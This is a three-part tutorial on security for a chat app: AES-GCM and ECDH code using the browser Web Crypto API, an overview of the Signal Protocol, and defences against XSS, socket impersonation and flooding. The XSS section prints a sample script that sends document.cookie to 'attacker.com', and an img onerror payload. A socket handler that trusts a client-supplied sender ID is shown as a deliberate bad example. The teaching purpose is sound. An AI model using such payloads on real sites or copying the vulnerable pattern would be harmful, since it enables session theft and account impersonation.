# 🛡️ Phase 13: Security — Part 1: Web Crypto API & E2EE Basics

Welcome to **Phase 13: Security**! In this part, we explore the foundations of End-to-End Encryption (E2EE) and browser-native cryptographic operations.

---

## 🔒 1. Transport Encryption vs. End-to-End Encryption (E2EE)

Before writing any crypto code, it's essential to understand the difference between **Transport Encryption** and **End-to-End Encryption**:

```
[Transport Encryption (TLS/HTTPS)]
User A (Plaintext) ----HTTPS---> Server (Reads Plaintext / DB) ----HTTPS---> User B (Plaintext)

[End-to-End Encryption (E2EE)]
User A (Encrypts) ----Ciphertext---> Server (Sees Garbage Text) ----Ciphertext---> User B (Decrypts)
```

- **Transport Encryption (HTTPS/WSS)**: Protects data while traveling over the wire between client and server. However, **the server can read all plaintext messages** and store them in MongoDB.
- **End-to-End Encryption (E2EE)**: Messages are encrypted directly on User A's browser **before** leaving the device. The server only receives encrypted data (ciphertext) and **cannot read the contents**, even if MongoDB is hacked!

---

## 🔑 2. Symmetric vs. Asymmetric Encryption

Modern E2EE systems combine two types of cryptography:

| Type | How It Works | Best Used For | Algorithm |
| :--- | :--- | :--- | :--- |
| **Symmetric Encryption** | Uses **one single shared secret key** to both encrypt and decrypt data. Extremely fast. | Encrypting chat messages, voice blobs, and file attachments. | **AES-GCM** (256-bit) |
| **Asymmetric Encryption** | Uses a **Key Pair**: a **Public Key** (shared with everyone) and a **Private Key** (kept secret on device). | Key Exchange (securing the shared symmetric key). | **ECDH** (Elliptic Curve Diffie-Hellman) |

---

## 🌐 3. What is the Web Crypto API (`window.crypto.subtle`)?

Modern browsers come with a high-performance, hardware-accelerated cryptographic engine accessible via `window.crypto.subtle`.

### Key Functions of `crypto.subtle`:
1. `generateKey()`: Creates new symmetric or asymmetric keys securely in browser memory.
2. `exportKey()` / `importKey()`: Converts raw keys to JSON Web Keys (`jwk`) or `raw` byte buffers for transfer.
3. `encrypt(algorithm, key, data)`: Encrypts plaintext data into an `ArrayBuffer` ciphertext.
4. `decrypt(algorithm, key, ciphertext)`: Decrypts `ArrayBuffer` ciphertext back to plaintext.

---

## 💻 4. Code Deep Dive: Encrypting & Decrypting a Message (AES-GCM)

Here is how message encryption works using the native Web Crypto API:

```javascript
// Step 1: Generate a random 256-bit AES-GCM Symmetric Key
async function generateSymmetricKey() {
  return await window.crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    true, // extractable
    ['encrypt', 'decrypt']
  )
}

// Step 2: Encrypt Plaintext Message
async function encryptText(text, key) {
  const encoder = new TextEncoder()
  const data = encoder.encode(text)

  // Initialization Vector (IV) - must be unique per message (12 bytes)
  const iv = window.crypto.getRandomValues(new Uint8Array(12))

  const ciphertextBuffer = await window.crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    data
  )

  return {
    ciphertext: btoa(String.fromCharCode(...new Uint8Array(ciphertextBuffer))),
    iv: btoa(String.fromCharCode(...iv))
  }
}

// Step 3: Decrypt Ciphertext Message
async function decryptText(ciphertextBase64, ivBase64, key) {
  const ciphertext = Uint8Array.from(atob(ciphertextBase64), c => c.charCodeAt(0))
  const iv = Uint8Array.from(atob(ivBase64), c => c.charCodeAt(0))

  const decryptedBuffer = await window.crypto.subtle.decrypt(
    { name: 'AES-GCM', iv },
    key,
    ciphertext
  )

  const decoder = new TextDecoder()
  return decoder.decode(decryptedBuffer)
}
```

---

## 🧠 Part 1 Recap & Checklist

- [x] Understand TLS/HTTPS vs E2EE.
- [x] Know why **AES-GCM-256** is used for message payload encryption.
- [x] Know why an **Initialization Vector (IV)** is required for every encrypted message.

---

# 🛡️ Phase 13: Security — Part 2: Key Exchange & Signal Protocol

In Part 1, we learned how to encrypt messages using **AES-GCM-256** with a shared secret key. Part 2 addresses how Alice and Bob obtain the exact same secret key across the Internet without sending the key over the server.

---

## 🎨 1. Diffie-Hellman Key Exchange (The Paint Analogy)

Imagine Alice and Bob want to agree on a secret color without anyone eavesdropping.

```
1. Public Agreement:  Alice & Bob start with a common public color (Yellow).
2. Private Secret:     Alice picks Secret Red. Bob picks Secret Blue.
3. Mixing & Public:    Alice mixes Yellow + Red -> Orange (sends to Bob).
                       Bob mixes Yellow + Blue -> Light Green (sends to Alice).
4. Secret Combination: Alice takes Light Green + her Secret Red -> Secret Brown.
                       Bob takes Orange + his Secret Blue -> Secret Brown.
```

An eavesdropper seeing the public messages (Orange & Light Green) cannot easily isolate the secret colors. Both Alice and Bob end up with the **exact same Secret Brown**!

---

## 🔑 2. Elliptic Curve Diffie-Hellman (ECDH) in Math & Code

In computer science, we use **Elliptic Curve Cryptography (ECDH)** instead of paint colors:

1. **Alice** generates a key pair: `(alicePrivateKey, alicePublicKey)`.
2. **Bob** generates a key pair: `(bobPrivateKey, bobPublicKey)`.
3. Alice uploads her `alicePublicKey` to the server. Bob uploads his `bobPublicKey`.
4. Alice computes: `deriveKey(alicePrivateKey, bobPublicKey) -> SharedSecret`
5. Bob computes: `deriveKey(bobPrivateKey, alicePublicKey) -> SharedSecret`

Both derive the **exact same 256-bit AES key**!

---

## 💻 3. Web Crypto API Code: ECDH Key Exchange

Here is how to perform an ECDH key exchange natively in the browser:

```javascript
// Step 1: Alice generates an ECDH Key Pair
async function generateECDHKeyPair() {
  return await window.crypto.subtle.generateKey(
    { name: 'ECDH', namedCurve: 'P-256' },
    true,
    ['deriveKey', 'deriveBits']
  )
}

// Step 2: Alice derives the Shared AES-GCM Key using Bob's Public Key
async function deriveSharedAESKey(myPrivateKey, peerPublicKey) {
  return await window.crypto.subtle.deriveKey(
    {
      name: 'ECDH',
      public: peerPublicKey // Bob's imported public key
    },
    myPrivateKey, // Alice's private key
    {
      name: 'AES-GCM',
      length: 256
    },
    false, // Shared key stays in secure memory!
    ['encrypt', 'decrypt']
  )
}
```

---

## 📡 4. Signal Protocol Overview (WhatsApp & Signal Architecture)

Basic Diffie-Hellman has two limitations:
1. Both users must be online at the same time to exchange keys.
2. If the secret key is leaked once, **all past and future messages** are compromised.

To solve this, real-world apps (Signal, WhatsApp, Telegram Secret Chats) use the **Signal Protocol**.

### The 3 Pillar Concepts of Signal Protocol:

#### A. PreKey Bundles (Offline Key Exchange)
When Bob registers, his device uploads a bundle of one-time public keys (PreKeys) to the server. When Alice wants to message Bob (even if Bob is offline), Alice fetches one of Bob's PreKeys, computes the shared key, and leaves the encrypted message for Bob!

#### B. The Double Ratchet Algorithm
Every single message sent generates a **brand new ephemeral key**:
- **KDF Ratchet**: A chain key continuously generates new message keys for each message.
- **DH Ratchet**: Every response back-and-forth performs a mini Diffie-Hellman update.

#### C. Forward Secrecy & Break-in Recovery
- **Forward Secrecy**: Past keys are destroyed immediately after decrypting. If your phone is seized tomorrow, past messages cannot be decrypted.
- **Break-in Recovery**: If an attacker steals your key today, as soon as the chat exchanges new messages, the ratchet heals itself and locks the attacker out of future messages!

---

## 🧠 Part 2 Recap & Checklist

- [x] Know how ECDH derives shared secret keys without sending them over the wire.
- [x] Understand PreKeys for offline asynchronous E2EE session creation.
- [x] Understand Forward Secrecy and Double Ratchet per-message key rotation.

---

# 🛡️ Phase 13: Security — Part 3: Application & Socket Security

While encryption protects message contents, **Application Security** ensures attackers cannot exploit your server, inject malicious code into client browsers, or spam your real-time socket server.

---

## 🚫 1. Cross-Site Scripting (XSS) & Input Sanitization

### What is XSS?
If an attacker sends a message like:
```html
<script>fetch('http://attacker.com/steal-session?cookie=' + document.cookie)</script>
```
or an image tag trick:
```html
<img src="x" onerror="alert(document.domain)">
```
And your UI renders it directly as raw HTML, the attacker's script executes in the recipient's browser with full access to their session!

### How We Prevent XSS:
1. **Default React String Escaping**: React automatically escapes text rendered inside `{msg.text}`, converting `<` to `&lt;` and `>` to `&gt;`.
2. **Avoid `dangerouslySetInnerHTML`**: Never use `dangerouslySetInnerHTML` unless passed through an explicit sanitizer like `DOMPurify.sanitize(dirtyHtml)`.
3. **Sanitize Inputs at API Boundary**: Strip or escape dangerous characters on the Express backend using libraries like `DOMPurify` or `validator.js`.

---

## 🔐 2. Socket Event Validation & Authorization

A common mistake in WebSocket apps is trusting payload data sent by clients.

### ❌ Dangerous Vulnerability Example:
```javascript
// Server trusts senderId provided in socket payload:
socket.on('send_message', ({ senderId, receiverId, text }) => {
  // ATTACKER sends senderId: "admin_user_id" -> Server impersonates Admin!
  Message.create({ senderId, receiverId, text })
})
```

### ✅ Secure Socket Pattern (Implemented in our `socketService.js`):
```javascript
// 1. Never trust payload senderId; ALWAYS pull authenticated userId from verified session!
const userId = socket.userId // Extracted during socket handshake authentication

socket.on('send_message', async ({ receiverId, text }) => {
  // 2. Explicitly verify that userId is a legitimate member of the target conversation
  const isMember = await Conversation.exists({
    _id: receiverId,
    'members.userId': userId
  })
  
  if (!isMember) {
    return callback({ error: 'Unauthorized: You are not a member of this chat' })
  }

  // 3. Save message using verified userId
  await Message.create({ senderId: userId, receiverId, text })
})
```

---

## ⚡ 3. Rate Limiting & Anti-Spam (HTTP & WebSockets)

Without rate limiting, a single malicious script can open thousands of connections or send 10,000 messages per second, crashing your Node.js backend.

### A. Express HTTP Rate Limiting (`express-rate-limit`)
Protects REST endpoints (e.g. `/api/auth/login`, `/api/upload`):
```javascript
import rateLimit from 'express-rate-limit'

export const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per 15 minutes
  message: { error: 'Too many requests, please try again later.' }
})
```

### B. Socket.IO Event Throttling (Leaky Bucket / Sliding Window)
Protects WebSocket event handlers from event flooding:
```javascript
const userMessageCounts = new Map() // userId -> { count, lastReset }

function checkSocketRateLimit(userId, maxPerSecond = 5) {
  const now = Date.now()
  const userRate = userMessageCounts.get(userId) || { count: 0, lastReset: now }

  if (now - userRate.lastReset > 1000) {
    userRate.count = 1
    userRate.lastReset = now
  } else {
    userRate.count++
  }

  userMessageCounts.set(userId, userRate)
  return userRate.count <= maxPerSecond
}

socket.on('send_message', async (payload, callback) => {
  if (!checkSocketRateLimit(userId, 5)) {
    if (callback) callback({ error: 'Rate limit exceeded. Slow down.' })
    return
  }
  // Proceed with processing message...
})
```

---

## 🧠 Part 3 Summary Table

| Security Aspect | Threat Prevented | Solution / Mitigation |
| :--- | :--- | :--- |
| **XSS Prevention** | Account takeover via script injection | React auto-escaping, avoiding `dangerouslySetInnerHTML`, input sanitization |
| **Socket Authorization** | Sender impersonation & unauthorized room access | Use `socket.userId` from authenticated handshake, verify membership in DB |
| **Rate Limiting** | Spam attacks & Denial of Service (DoS) | `express-rate-limit` for REST, sliding window leaky bucket counter for Sockets |

---

## 🧠 Phase 13 Complete Learning Checklist

- [x] Part 1: Web Crypto API & E2EE Basics (`AES-GCM-256`, IV)
- [x] Part 2: Diffie-Hellman Key Exchange (`ECDH`) & Signal Protocol
- [x] Part 3: Application Security (XSS, Socket Validation, Rate Limiting)


